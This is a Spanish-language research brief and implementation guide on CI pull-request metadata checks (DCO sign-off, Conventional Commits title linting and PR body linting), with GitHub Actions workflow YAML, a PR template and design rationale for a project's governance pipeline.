# 05e — PR Metadata Checks: DCO, Título y Body Templates en Enterprise

> **Guía 05e — Research Brief + Implementation Guide** (después de 05d) | Anterior: [05d-ci-commit-lint-implementation.md](./05d-ci-commit-lint-implementation.md)
>
> Esta guía documenta la investigación completa sobre **PR Metadata Checks** (DCO sign-off, PR title validation, body templates) con foco en entornos enterprise. Cubre el landscape de herramientas, interacción con squash-merge, patrones de implementación enterprise, y la **implementación completa** del change `ci-pr-metadata-governance` para Project-one.
>
> **Estado**: Implementado en `feat/ci-governance` (commits `128a0e8` → `31d445f`). Blocking desde
> 2026-08-31. Admin-1 (squash = PR_TITLE) verificado por API; el resto de este doc se conserva como
> runbook. La validación del **body** está
> documentada con su implementación de referencia en FASE 1 advisory (`pr-body-lint`, P2.1-P2.7):
> el job **aún no existe en `ci.yml`** — este doc precede al change que lo aterrice.

---

## 🎯 Objetivo

Responder tres preguntas concretas:

1. **¿Qué son los PR Metadata Checks y por qué importan?**
2. **¿Cómo interactúan con squash-merge (nuestro flujo)?**
3. **¿Qué implementamos nosotros y en qué orden?**

---

## 📋 Resumen Ejecutivo

| Check             | Qué valida                                                  | Enterprise value                                                 | Effort | Priority                               |
| ----------------- | ----------------------------------------------------------- | ---------------------------------------------------------------- | ------ | -------------------------------------- |
| **PR Title Lint** | Título del PR sigue Conventional Commits                    | Alto — cierra gap del squash message final                       | S      | **P1**                                 |
| **DCO Sign-off**  | Cada commit tiene `Signed-off-by` (trazabilidad de autoría) | Alto — audit trail compliance                                    | S      | **P1.5**                               |
| **PR Body Lint**  | Body con contenido significativo + 3 secciones nucleares    | Alto — trazabilidad real y evidencia de documentación del cambio | S-M    | **P2 (automatizado, FASE 1 advisory)** |

> **Dato medido**: template intacto = 1.134 caracteres de body → **0 caracteres de contenido útil**
> tras normalizar — por eso un check "non-empty" es teatro puro.

**Hallazgo estrella**: el lint de PR title **CIERRA** el gap documentado del squash-message (05d). Con `squash_merge_commit_title=PR_TITLE`, el título del PR se convierte en el mensaje del commit final en main — lintearlo = garantizar que main siempre tenga commits convencionales.

---

## 🏗️ ¿Qué son los PR Metadata Checks?

En un flujo PR-based, hay tres momentos donde se puede enforce governance:

```
1. ANTES del commit    → hook commit-msg (commitlint)       ← ya lo tenemos (05d)
2. AL crear el PR      → PR title + body + signed-off-by     ← ESTE DOC
3. AL hacer merge      → ruleset required checks             ← ya lo tenemos (ruleset 21227644)
```

Los PR Metadata Checks operan en el **momento 2** — cuando se crea o actualiza el PR. Son la capa que validla **intención y trazabilidad** del cambio, no solo el formato del código.

### Los tres componentes

| Componente        | Qué es                                                                        | Herramienta                              |
| ----------------- | ----------------------------------------------------------------------------- | ---------------------------------------- |
| **PR Title Lint** | Valida que el título del PR siga Conventional Commits (`feat:`, `fix:`, etc.) | `amannn/action-semantic-pull-request@v6` |
| **DCO Sign-off**  | Valida que cada commit del PR tenga `Signed-off-by: Name <email>`             | `KineticCafe/actions-dco@v3.2.0`         |
| **PR Template**   | Estructura predefinida del body del PR (summary, issue link, testing, etc.)   | `.github/PULL_REQUEST_TEMPLATE.md`       |

---

## 🔬 DCO Sign-off: Deep Dive

### ¿Qué es el DCO?

**Developer Certificate of Origin** — declaración legal estandarizada (Linux Foundation, DCO v1.1) que certifica: _"Tengo derecho a contribuir este código bajo la licencia del proyecto"_.

Se manifiesta como un trailer en el commit:

```
feat: add payment flow

Signed-off-by: DevJohan <johan@empresa.com>
```

Se añade con `git commit -s` (flag `-s`).

### DCO vs Firma SSH/GPG

|                           | Firma SSH/GPG                                  | DCO                                      |
| ------------------------- | ---------------------------------------------- | ---------------------------------------- |
| **Naturaleza**            | Criptográfica                                  | Legal/Contractual                        |
| **Prueba**                | Autenticidad (quién escribió, no fue alterado) | Derecho (certifico que puedo contribuir) |
| **No repudiable**         | Sí (firma matemática)                          | No (es una declaración honoraria)        |
| **Protege contra**        | Suplantación, tampering                        | Demandas por código sin derechos         |
| **Requiere**              | Clave SSH/GPG registrada                       | `git commit -s` + email correcto         |
| **¿Son complementarios?** | SÍ — cubren capas distintas                    | SÍ — identidad vs derecho                |

### ¿Cuándo importa el DCO?

```
¿Quién contribuye?

├── Solo employees internos
│   ├── Contrato laboral YA asigna IP → DCO es REDUNDANTE técnicamente
│   ├── PERO enterprise lo usa como AUDIT TRAIL (evidencia intencional)
│   └── SOC2/ISO27001: trazabilidad de cambios = control requerido
│
├── Employees + contractors
│   ├── Contractor agreement cubre IP assignment
│   ├── DCO = evidencia adicional (paper trail)
│   └── Enterprise verdict: DCO recomendado
│
└── Open-source (externos)
    ├── NO hay contrato que cubra IP
    ├── DCO = MÍNIMO OBLIGATORIO
    └── CLA = ideal pero más pesado
```

### Herramientas de DCO (Comparación)

| Herramienta                          | Tipo            | Mantenimiento         | Bot handling                                              | Veredicto          |
| ------------------------------------ | --------------- | --------------------- | --------------------------------------------------------- | ------------------ |
| `probot/dco` (DCO App clásica)       | GitHub App      | ❌ MUERTA (~2024)     | Exenta bots por defecto                                   | **No usar**        |
| `cncf/dco2` (App nueva CNCF)         | GitHub App      | ✅ Activa 2026 (Rust) | Categorías config                                         | Alternativa App    |
| **`KineticCafe/actions-dco@v3.2.0`** | GitHub Action   | ✅ Activa             | **RICHEST**: policy all/well-known/allowlist + categorías | **ELEGIDA**        |
| `tisonkun/actions-dco`               | GitHub Action   | Baja actividad        | Básico                                                    | Alternativa simple |
| `christophebedard/dco-check`         | Script multi-CI | Moderada              | Por plataforma                                            | Alternativa        |
| Custom script                        | Self-hosted     | Dependencia tuya      | Tú implementas                                            | Control total      |

### ¿Por qué KineticCafe?

- **Config TOML rica**: policy `well-known` con categorías predefinidas
  - `dependency-updaters`: dependabot[bot], renovate[bot], snyk-bot[bot]
  - `ci-cd`: github-actions[bot]
  - `release`: semantic-release[bot], release-please[bot]
- **Parsing inteligente**: maneja edge cases de dependabot (email `support@github.com` ≠ author email)
- **Action, no App**: no necesitas instalar GitHub App con permisos extendidos
- **Políticas granulares**: `all` (exenta todos), `well-known` (solo categorías conocidas), `allowlist` (explícitos), `none` (nadie exento)

```toml
# .github/dco-check.toml
[bot]
policy = "well-known"
categories = ["dependency-updaters"]
```

### Enforcement en 3 capas (shifting-left)

El DCO se valida en **3 capas** (de más temprana a más autoritativa):

1. **L1/L2 — hooks locales:** `prepare-commit-msg` añade el trailer automáticamente (idempotente, no suprimible por `--no-verify`) y `commit-msg` valida la presencia antes de commitlint (salta merge commits) — **único gate local**; `pre-push` **no valida DCO** (solo fetch + guard de `origin/main` + tests scoped). Feedback inmediato, antes de CI.
2. **`/commit-all` (git-manager prompt, regla 10):** los commits generados por el agente usan SIEMPRE `git commit -S -s` → trailer `Signed-off-by: Name <email>` garantizado (defense-in-depth; `commit.signoff` no existe en git).
3. **L3 — CI KineticCafe:** el check `DCO` del ruleset (no-bypassable en el flujo normal) — parser autoritativo de trailers.

El auto-signoff real lo aporta `.husky/prepare-commit-msg`; `commit.signoff` no existe en git y no inyecta nada (ver `docs/learning/dco.md` y `docs/CONTEXT-CICD.md` §10.3/§10.5). Detalle operativo de las capas: `docs/CONTEXT-CICD.md` §10-§11.

---

## 🔨 Squash-Merge × DCO: La Historia Real

### ¿Preserva GitHub los `Signed-off-by` en squash?

**SÍ, SI el setting es correcto.** GitHub squash NO descarta trailers automáticamente — depende de `squash_merge_commit_message`:

| Setting               | ¿Preserva Signed-off-by?                                                   |
| --------------------- | -------------------------------------------------------------------------- |
| `DEFAULT`             | Depende del formato del commit message original                            |
| `PR_TITLE`            | Solo preserva el título (body se pierde si COMMIT_MESSAGES no está activo) |
| **`COMMIT_MESSAGES`** | ✅ **SÍ** — concatena mensajes originales incluyendo trailers              |
| `PR_BODY`             | Preserva el body del PR                                                    |
| `BLANK`               | ❌ NO — descarta todo                                                      |

**Nuestro setting actual**: `COMMIT_MESSAGES` → **los trailers SÍ sobreviven al squash**. ✅

### Flujo completo con DCO + squash

```
PR con 3 commits:
  feat: A
  Signed-off-by: Juan <juan@empresa.com>
  fix: B
  Signed-off-by: María <maria@empresa.com>
  docs: C
  Signed-off-by: Juan <juan@empresa.com>

  └─► Squash-MERGE (COMMIT_MESSAGES setting)
      └► Commit en main:
          Subject: feat(auth): add payment flow  ← del PR title
          Body:
            feat: A                              ← de COMMIT_MESSAGES
            Signed-off-by: Juan                  ← PRESERVADO ✅
            fix: B
            Signed-off-by: María                 ← PRESERVADO ✅
            docs: C
            Signed-off-by: Juan                  ← PRESERVADO ✅
```

### CNCF/LF avala este patrón

LF oficial recomienda: _"When merging... include Signed-off-by lines from every contributor, and add one for you as the person merging."_ → nuestro setting `COMMIT_MESSAGES` hace esto automáticamente.

### El workaround enterprise (4 opciones)

| Opción                   | Descripción                                     | Fricción | Nuestro caso        |
| ------------------------ | ----------------------------------------------- | -------- | ------------------- |
| (a) PR como audit record | DCO check en PR + GitHub audit log = suficiente | Baja     | ✅ Nuestro approach |
| (b) Maintainer re-signa  | Humano pega trailers en squash dialog           | Alta     | ❌ No práctico      |
| (c) Push ruleset regex   | Requiere Team/Enterprise plan                   | Media    | ⚠️ Futuro opcional  |
| (d) Ignore post-squash   | Solo audit log                                  | Muy baja | ⚠️ Débil solo       |

**Nuestro approach: (a) + setting COMMIT_MESSAGES** → los trailers sobreviven al squash sin intervención manual.

---

## 📝 PR Title Lint: Deep Dive

### ¿Por qué importa en squash-merge?

Con `squash_merge_commit_title=PR_TITLE`:

- El título del PR = el mensaje del commit final en main
- PR Title Lint valida ese título ANTES del merge
- **Resultado**: main siempre recibe commits convencionales ✅

Con `COMMIT_OR_PR_TITLE` (nuestro setting actual):

- Single commit PR → squash usa commit message (ya validado por commit-lint)
- Multi-commit PR → squash usa PR title (validado por PR Title Lint)
- **Resultado**: ambos cubiertos ✅ (pero inconsistente — PR_TITLE es más simple)

### Herramienta: amannn/action-semantic-pull-request@v6

```yaml
pr-title-lint:
  name: PR Title Lint
  runs-on: ubuntu-latest
  permissions:
    pull-requests: read
  if: github.event_name == 'pull_request'
  steps:
    - uses: amannn/action-semantic-pull-request@v6
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        types: |
          feat
          fix
          docs
          style
          refactor
          perf
          test
          build
          ci
          chore
          revert
          ops
        requireScope: false
        ignoreLabels: |
          bot
          ignore-semantic-pull-request
```

**Types** — alineados con `@commitlint/config-conventional` (nuestra config actual de commitlint).

---

## 📋 PR Template: Deep Dive

### ¿Por qué es un control de compliance?

En enterprise, el PR template no es "comodidad" — es **evidencia de gobierno del cambio**:

| Sección del template | Control de compliance             | SOC2/ISO reference        |
| -------------------- | --------------------------------- | ------------------------- |
| Summary              | Qué cambió y por qué              | CC8.1 (Change Management) |
| Type/Scope           | Clasificación del cambio          | CC6.1 (Logical Access)    |
| Related Issue        | Traceabilidad requirements→code   | CC8.1, ISO A.8.1          |
| Testing              | Evidencia de validación           | CC7.1 (System Operations) |
| Screenshots          | Evidencia visual                  | CC8.1                     |
| Checklist            | Auto-verification del contributor | CC8.1                     |

### Template recomendado para Project-one

```markdown
## Summary

<!-- ¿Qué hace este cambio y por qué? -->

## Type / Scope

<!-- Marca uno: -->

- [ ] Client (React/Vite)
- [ ] Server (Express/Prisma)
- [ ] E2E (Playwright)
- [ ] Shared/Config
- [ ] CI/CD

## Related Issue

<!-- Link al ticket/story — required para trazabilidad -->

Closes #

## How Has This Been Tested?

<!-- Evidencia de testing — SOC2 CC8.1 -->

- [ ] Unit tests (vitest)
- [ ] Integration tests
- [ ] E2E tests (playwright)
- [ ] Manual testing
- [ ] N/A (docs/config only)

## Screenshots (if applicable)

<!-- Evidencia visual para cambios UI -->

## Pre-merge Checklist

- [ ] Signed-off-by present in all commits (`git commit -s`)
- [ ] Tests pass locally
- [ ] Documentation updated (if needed)
- [ ] No breaking changes (or documented in Summary)
```

### Enforcement real: ¿se puede forzar el body?

**GitHub no lo hace de forma nativa** — el template solo pre-rellena la web UI (y `gh pr create --fill` lo
reemplaza, no lo fusiona). **PERO sí es automatizable** con `actions/github-script` leyendo
`context.payload.pull_request.body` (sin interpolación `${{ }}`, ver gotcha 6).

| Opción                                   | Effort     | Realidad 2026                                                                                                      |
| ---------------------------------------- | ---------- | ------------------------------------------------------------------------------------------------------------------ |
| `actions/github-script` custom           | Medio      | **Recomendado** — estándar de facto, sin deps ni token extra, sin comentario por PR                                |
| Danger.js (`danger@14.0.7`)              | Medio-Alto | Válido (Snyk Health 85/100) pero sobredimensionado: runtime propio + `DANGER_GITHUB_API_TOKEN` + comentario por PR |
| Probot / policedown / template-checker   | Medio      | **No usar** — OpenSSF Scorecard `Maintained 0/10`; `probot/stale` archived; exige App+webhook                      |
| `amannn/action-semantic-pull-request@v6` | —          | Solo valida el **title**, NO el body (correcto para su caso de uso)                                                |
| Prow `release-note` (Kubernetes)         | Alto       | Mejor precedente enterprise: bloque estructurado + escape `NONE` + label blocker vía Tide                          |

**Lo que funciona en enterprise es contenido estructurado con escape** (patrón Prow/Kubernetes), no
conformance genérica de headings. La automatización total del body es fricción; la automatización del suelo
(contenido significativo + 3 secciones) cuesta ~1 día y aporta trazabilidad real.

---

## 📊 Decisiones de Diseño (Research-Backed)

### D1: DCO como job paralelo separado (no unificar con commitlint)

| Razón                          | Detalle                                                                |
| ------------------------------ | ---------------------------------------------------------------------- |
| Separación de concerns         | commitlint = formato; DCO = trazabilidad legal                         |
| Required checks independientes | Si uno falla, el otro sigue valido para debugging                      |
| Rollout independiente          | Se puede activar antes/después                                         |
| Patrón consistente             | Mismo patrón que commit-lint: job paralelo, no needs, ci-complete gate |

### D2: Squash setting unchanged vs changed

| Setting actual     | `COMMIT_OR_PR_TITLE` + `COMMIT_MESSAGES`                                                                                  |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| Pros               | Single-commit: commit msg (commit-lint); multi: PR title (PR Title Lint)                                                  |
| Contras            | Inconsistente: a veces linteamos título, a veces commit message                                                           |
| Cambio propuesto   | `PR_TITLE` + `COMMIT_MESSAGES`                                                                                            |
| Pros del cambio    | Consistente: siempre PR title = squash subject = lo que PR Title Lint valida                                              |
| Contras del cambio | Single-commit PRs cuyo commit message es good pero PR title no → PR Title Lint falla (eso es BUENO — fuerza consistencia) |

**Decisión**: cambiar a `PR_TITLE` para consistencia.

### D3: Body validation — contenido significativo automatizado (FASE 1 advisory), no conformance total

**Contexto medido**: el template de este repo ocupa 1.134 caracteres de body y **0 caracteres de contenido
útil** tras normalizar (comentarios HTML + headings + casillas sin marcar + `Closes #` sin número se
eliminan). Un check `body !== ''` lo satisface el 100 % de los PRs abiertos por la web UI ⇒ **teatro**.

**Decisión**: automatizar el **suelo**, no la forma:

- R1: contenido útil ≥ 40 chars (error)
- R2: `## Summary`, `## Related Issue`, `## How Has This Been Tested?` con ≥ 20 chars útiles cada una (error)
- R3: `Closes #` sin número (error)
- R4: ≥ 1 casilla marcada (warn) · R5: referencia a issue (warn)

**Descartado**: exigir las 6 secciones (`Screenshots (if applicable)` es condicional), exigir la checklist
completa (entrena a marcar sin leer), detectar "comentario HTML del template aún presente" (los comentarios
persisten aunque se rellene la sección).

**No automatizado por diseño**: calidad y veracidad del contenido (p. ej. la veracidad de "How Has This
Been Tested?") — eso es review humana + CODEOWNERS.

**Fase**: FASE 1 advisory (`continue-on-error: true`) + artifact 14 d; graduación a blocking tras 2 semanas
de corridas reales / 0 falsos positivos sin triar / evidencia en `pr-body-lint-report`. El ruleset **no** se
toca (el check no es required).

---

## 🗺️ Implementación

> **OpenSpec change**: `ci-pr-metadata-governance` | **Commits**: `128a0e8` → `31d445f`
> **Branch**: `feat/ci-governance` | **Schema**: spec-driven

### Resumen de Cambios

| #   | Commit    | Descripción                                                      |
| --- | --------- | ---------------------------------------------------------------- |
| 1   | `128a0e8` | Research brief (este doc)                                        |
| 2   | `577a443` | OpenSpec change artifacts (proposal, spec, design, tasks)        |
| 3   | `d8fdd6f` | Fix 5 planner issues in spec/design/tasks                        |
| 4   | `c3cc1c7` | **PR Title Lint + DCO jobs** in ci.yml + ci-complete gate update |
| 5   | `cc400b4` | Fix malformed `ignoreLabels` YAML in pr-title-lint               |
| 6   | `a5fb76b` | Mark Tasks 1-7 acceptance criteria complete                      |
| 7   | `d92f89b` | **Fix**: add `pull-requests: read` to DCO permissions            |
| 8   | `31d445f` | **PR Template + CODEOWNERS + CONTRIBUTING.md**                   |

---

### P1: PR Title Lint — `amannn/action-semantic-pull-request@v6`

**Ubicación**: `.github/workflows/ci.yml`

#### Por qué esta herramienta

- **13k+ stars**, activamente mantenida (v6, 2025)
- Configurable: `types`, `requireScope`, `subjectPattern`, `ignoreLabels`
- Soporte nativo para `merge_group` events (requerido para merge queue)
- No necesita GitHub App — es un Action simple

#### Job implementado

```yaml
pr-title-lint:
  name: PR Title Lint # ← CRITICAL: nombre exacto para ruleset
  runs-on: ubuntu-latest
  permissions:
    pull-requests: read # ← Necesario para leer PR title
  steps:
    # PR events: valida título contra Conventional Commits
    - name: Lint PR title
      if: github.event_name == 'pull_request'
      uses: amannn/action-semantic-pull-request@v6
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        types: | # ← Mismos types que commitlint config-conventional + ops
          feat
          fix
          docs
          style
          refactor
          perf
          test
          build
          ci
          chore
          revert
          ops
        requireScope: false
        ignoreLabels: | # ← Bots pueden saltar con este label
          bot
          ignore-semantic-pull-request
        subjectPattern: '^(?![A-Z]).+$' # ← Rechaza mayúscula inicial; permite acrónimos internos
        subjectPatternError: 'PR title must follow Conventional Commits format: type(scope): description with lowercase subject'
    # Merge queue: squash commit title ya validado por commitlint --last
    - name: Skip on merge_group (covered by commitlint)
      if: github.event_name == 'merge_group'
      run: echo "✅ Merge queue — squash commit title validated by commitlint"
  # Blocking since 2026-08-31 (continue-on-error removed). Required status check in ruleset 21227644.
```

#### Decisiones clave

1. **Sin `needs`**: job corre en paralelo — no bloquea ni es bloqueado
2. **`permissions: pull-requests: read`**: necesario para leer el título del PR vía API
3. **`merge_group` step**: emite success neutral — required check satisfacible en merge queue
4. **`continue-on-error` eliminado el 2026-08-31** → blocking. Decisión: un check required + non-blocking
   erosiona la confianza del equipo en el gate (mismo criterio que DCO)
5. **`name: PR Title Lint`**: string exacto que debe coincidir con el ruleset (D5)
6. **`subjectPattern` aplicado desde 2026-08-31** (`^(?![A-Z]).+$`): rechaza la mayúscula inicial pero
   permite acrónimos internos tipo "AWS"; se usa `subjectPatternError` con mensaje accionable

#### Flujo de validación

```
PR abierto → PR Title Lint corre
  ├── Título válido (feat: ..., fix: ...) → ✅ pass
  ├── Título inválido (feature: ..., add ...) → ❌ fail
  ├── PR con label "bot" → skip (ignoreLabels)
  └── merge_group event → emite success (commitlint cubre esto)
```

---

### P1.5: DCO Sign-off — `KineticCafe/actions-dco@v3.2.0`

**Ubicación**: `.github/workflows/ci.yml`

#### Por qué KineticCafe

- **Policy `well-known`**: whitelist automática de dependabot[bot], renovate[bot], snyk-bot[bot]
- **Edge case dependabot**: author email = `+dependabot[bot]@users.noreply.github.com`, sign-off = `support@github.com` — KineticCafe maneja esto; scripts custom fallan
- **TOML config**: versionable en el repo, no hardcoded
- **Action, no App**: no necesita instalación de GitHub App con permisos extendidos

#### Job implementado

```yaml
dco:
  name: DCO # ← CRITICAL: nombre exacto para ruleset
  runs-on: ubuntu-latest
  permissions:
    contents: read # ← Para leer archivos del repo
    pull-requests: read # ← Para enumerar commits del PR (pulls.listCommits)
  steps:
    # PR events: valida Signed-off-by en todos los commits
    - name: DCO sign-off check
      if: github.event_name == 'pull_request'
      uses: KineticCafe/actions-dco@v3.2.0
      with:
        config: |
          [bot]
          policy = "well-known"
          categories = ["dependency-updaters"]
    # Merge queue: DCO es check de PR-level; squash commit no lleva trailers individuales
    - name: Skip on merge_group (PR-level check)
      if: github.event_name == 'merge_group'
      run: echo "✅ Merge queue — DCO validated at PR level"
  # Blocking since 2026-08-31 (continue-on-error removed). Required status check in ruleset 21227644.
```

#### Bug encontrado por reviewer: DCO permissions

**Problema**: el job solo tenía `contents: read`. `KineticCafe/actions-dco` necesita `pull-requests: read` para enumerar commits del PR vía `pulls.listCommits`. Sin esto → HTTP 403 en runtime.

**Impacto histórico**: el bug quedó enmascarado por `continue-on-error: true` durante Phase 1. El fix
(`d92f89b`) se aplicó antes de activar blocking, así que hoy el riesgo está **cerrado** — si el bug
volviera, bloquearía TODOS los merges.

**Fix** (`d92f89b`):

```yaml
permissions:
  contents: read
  pull-requests: read # ← AGREGADO
```

**Lección**: siempre verificar si un Action necesita acceso a la API de PRs, no solo a contents.

#### Config TOML: `well-known` policy

```toml
[bot]
policy = "well-known"
categories = ["dependency-updaters"]
```

| Policy           | Comportamiento                                                                                                                                        |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `all`            | Exenta a TODOS los bots (débil)                                                                                                                       |
| **`well-known`** | Solo categorías conocidas: `dependency-updaters` (dependabot, renovate, snyk), `ci-cd` (github-actions), `release` (semantic-release, release-please) |
| `allowlist`      | Solo bots explícitos                                                                                                                                  |
| `none`           | Nadie exento — todos firman                                                                                                                           |

#### Flujo de dependabot

```
dependabot abre PR → DCO job corre
  ├── Bot detectado → SKIPPED (well-known policy)
  ├── GitHub ve: DCO = success (skipped = success)
  ├── PR Title Lint corre normalmente (dependabot titles follow convention)
  └── Todos los checks pasan → merge permitido ✅
```

---

### P2: ci-complete Gate Update

**Ubicación**: `.github/workflows/ci.yml`

#### Patron ADD-only

Regla estricta: **NUNCA eliminar o modificar** jobs existentes en `ci-complete.needs`. Solo agregar.

```yaml
ci-complete:
  if: ${{ vars.CI_MINIMAL != 'true' && always() }} # ← PRESERVE exactamente
  name: CI Complete
  runs-on: ubuntu-latest
  needs:
    - repo-discovery
    - prebuild-governance-complete
    - prebuild-quality-complete
    - prebuild-security-complete
    - prebuild-unit-tests-complete
    - verify-signatures
    - zombie-workflow-guard
  steps:
    - name: Check for failures
      run: |
        if [[ "${{ contains(needs.*.result, 'failure') }}" == "true" ]]; then
          echo "❌ One or more upstream jobs failed"
          exit 1
        fi
        if [[ "${{ contains(needs.*.result, 'cancelled') }}" == "true" ]]; then
          echo "⚠️ One or more upstream jobs were cancelled — skipping ci-complete"
          exit 0
        fi
        echo "✅ All upstream jobs succeeded or were skipped"
```

Forma actual: `ci-complete.needs` son **7 entradas** — los 4 agregadores por substage
(`prebuild-governance-complete`, `prebuild-quality-complete`, `prebuild-security-complete`,
`prebuild-unit-tests-complete`) + `verify-signatures` + `zombie-workflow-guard` + `repo-discovery`. La lista
plana de 32 jobs de la v1 del change quedó obsoleta al consolidarse los agregadores de substage.

- La regla **ADD-only sigue vigente**: nunca quitar ni modificar una entrada existente; solo agregar.
- Los jobs nuevos de governance se wirean al agregador de su substage
  (`prebuild-governance-complete.needs`), **NO** a `ci-complete.needs` (precedente: `sast`).
- `CI Complete` **no** está en el ruleset 21227644 — es agregador de salud, no required status check.

---

### P2: dependabot.yml Fix

**Ubicación**: `.github/dependabot.yml:14-15`

**Problema**: dependabot genera PRs con título `Bump X from Y to Z`. PR Title Lint rechaza `Bump` (no es un type válido).

**Fix**: agregar `commit-message: prefix: "fix"` al ecosystem npm:

```yaml
- package-ecosystem: 'npm'
  directory: '/'
  schedule:
    interval: 'weekly'
    day: 'monday'
    time: '03:00'
    timezone: 'UTC'
  open-pull-requests-limit: 10
  labels:
    - 'dependencies'
    - 'automated'
  commit-message:
    prefix: 'fix' # ← AGREGADO: "fix(deps): Bump X from Y to Z"
  groups:
    dev-dependencies:
      patterns: [...]
```

**Resultado**: dependabot PR titles → `fix(deps): Bump X from Y to Z` → PR Title Lint pasa ✅

---

### P2: PR Template

**Ubicación**: `.github/PULL_REQUEST_TEMPLATE.md`

**6 secciones** — cada una es un control de compliance enterprise:

```markdown
## Summary

<!-- What does this PR do and why? Link to context if needed. -->

## Type / Scope

<!-- Check all that apply: -->

- [ ] Client (React/Vite)
- [ ] Server (Express/Prisma)
- [ ] E2E (Playwright)
- [ ] Shared/Config
- [ ] CI/CD

## Related Issue

<!-- Required for traceability. Use "Closes #<number>" to auto-close on merge. -->

Closes #

## How Has This Been Tested?

<!-- Describe the tests you ran. Provide reproducibility steps if manual. -->

- [ ] Unit tests (vitest)
- [ ] Integration tests
- [ ] E2E tests (Playwright)
- [ ] Manual testing
- [ ] N/A (docs/config only)

## Screenshots (if applicable)

<!-- Add screenshots or screen recordings for UI changes. Remove this section if not applicable. -->

## Pre-merge Checklist

- [ ] `Signed-off-by` present in all commits (`git commit -S -s`; the `.husky/prepare-commit-msg` hook adds it automatically — see `docs/learning/dco.md`)
- [ ] Tests pass locally (`npm run test`)
- [ ] Documentation updated (if applicable)
- [ ] No breaking changes (or documented in Summary)
- [ ] PR title follows [Conventional Commits](https://www.conventionalcommits.org/) format
```

**Nota**: el template es el contrato que valida `pr-body-lint` (ver P2.1-P2.7). Si un heading cambia, la
política debe cambiar en el mismo PR (test de lockstep).

---

### P2.1: pr-body-lint — job de governance (ADOPTADO: workflow propio, gate duro desde el 1er commit)

> **Estado (2026-10-20, change `pr-metadata-workflow`): IMPLEMENTADO.** El job vive en
> `.github/workflows/pr-metadata.yml` (NO en `ci.yml`), es **blocking desde su primer commit** (FASE 1 advisory
> descartada por decisión explícita del usuario — design D8) y su contexto `Governance: PR Body Lint` entra al
> ruleset 21227644 como **FASE 3** en cuanto reporte ≥1 vez. La variante "job en `ci.yml` + `continue-on-error`"
> que describía esta sección quedó **rechazada por estructura**: `ci.yml` no dispara en `edited` (el body no se
> re-validaría al corregirlo) y su `concurrency: cancel-in-progress: true` cancelaría el pipeline en vuelo por una
> edición de texto (design D1/D8/D9b).
>
> **Posición**: workflow `.github/workflows/pr-metadata.yml`, job `pr-body-lint`. **Versiones**:
> `actions/github-script@v9` (tag real verificado: v9.0.0). El repo aún usa `@v8` en 5 call-sites de otros
> workflows — la coexistencia es válida y no exige migrar nada.
>
> **El YAML siguiente es un BORRADOR HISTÓRICO** (plan FASE 1 advisory, previo al change). La versión vigente es la
> del workflow propio: checkout desde `base.sha` con sparse-checkout (D9b), job-level `if` por AUTOR bot, steps
> `if: github.event_name == 'pull_request'`, upload con `if: always()` y no-op explícito de `merge_group` (D5).
> La ruta "FASE 1 → FASE 2" que comenta el bloque fue reemplazada por el gate duro del día 1, con las
> mitigaciones que listaba P2.4.

```yaml
# --- GOVERNANCE: PR body lint (job a implementar; FASE 1 advisory) ---
# Valida la DESCRIPCIÓN del PR, no el título (eso es `pr-title-lint`).
# Seguridad: el body se lee de `context.payload` dentro del módulo (ver P2.3).
# NUNCA interpolar `${{ github.event.pull_request.body }}` (ni el título) en
# `run:` (shell) NI en `script:` (se evalúa como JavaScript — README de la
# action github-script).
#
# Variante módulo extraído (recomendada; precedente `scripts/sast-diff.mjs`
# compartido por pre-push + CI): la lógica pura vive en
# `scripts/ci/pr-body-lint.mjs` (testeable, ver P2.7) y el `script` de
# github-script es un wrapper fino de 3 líneas.
#
# FASE 1 (actual): `continue-on-error: true` — reporta, no bloquea.
# Criterio de graduación a FASE 2 (en lockstep con
# docs/learning/quality-gates.md §7 — misma ventana de calibración):
#   1) >=2 semanas de corridas reales sobre PRs;
#   2) 0 fallos sin triar (todo fallo = true positive corregido, o false
#      positive justificado y corregido en la política);
#   3) evidencia en el artifact `pr-body-lint-report` (14 días).
# Al cumplirse: quitar `continue-on-error: true`. El ruleset 21227644 NO se toca.
pr-body-lint:
  name: 'Governance: PR Body Lint'
  runs-on: ubuntu-latest
  timeout-minutes: 5
  if: github.event_name == 'pull_request'
  permissions:
    contents: read # necesario: checkout del módulo extraído
    pull-requests: read # semántico y de coste cero; el body viene en el payload
  continue-on-error: true
  steps:
    - uses: actions/checkout@v5
    - name: Validate PR body against governance policy
      uses: actions/github-script@v9
      with:
        script: |
          // Wrapper fino: la lógica pura vive en el módulo (testeable con vitest)
          const { evaluate } = require('./scripts/ci/pr-body-lint.mjs');
          await evaluate({ core, context });
    # Evidencia de la ventana de calibración (mismo patrón que `sast-report`).
    # El reporte lo escribe el propio módulo; sin `npm install`. El paso usa
    # `if: always()` porque el veredicto es evidencia incluso en job rojo.
    # `include-hidden-files: true` es OBLIGATORIO: `.tmp/` es un path OCULTO
    # y upload-artifact@v4+ lo excluye por defecto.
    - name: Upload PR body report (14-day calibration evidence)
      if: always()
      uses: actions/upload-artifact@v7
      with:
        name: pr-body-lint-report
        path: .tmp/pr-body-lint/report.json
        retention-days: 14
        if-no-files-found: warn
        include-hidden-files: true
```

**Wiring** — ADD-only en el agregador de substage:

```yaml
prebuild-governance-complete:
  if: ${{ vars.CI_MINIMAL != 'true' && always() }}
  name: Prebuild Governance Complete
  needs:
    - verify-signatures
    - commit-lint
    - pr-title-lint
    - dco
    - pr-body-lint # ← AÑADIR (5.ª entrada)
```

> **No** añadir a `ci-complete.needs` — mismo precedente que `sast`: FASE 2 llega a `CI Complete`
> solo de forma transitiva vía `prebuild-governance-complete`.
> `prebuild-governance-complete` está gated por `vars.CI_MINIMAL != 'true'`; con `CI_MINIMAL=false`
> (desde 2026-09-17) corre. ✅

---

### P2.2: Normalización y reglas (R1-R5)

| ID                           | Regla                                                                          | Severidad | Umbral                                 | Rationale                                                               | FP esperados                                                              |
| ---------------------------- | ------------------------------------------------------------------------------ | --------- | -------------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| `R1` `meaningful-content`    | Contenido significativo propio                                                 | **error** | ≥ 40 caracteres útiles tras normalizar | Única regla que separa "template pegado" de "PR explicado"              | Muy bajos                                                                 |
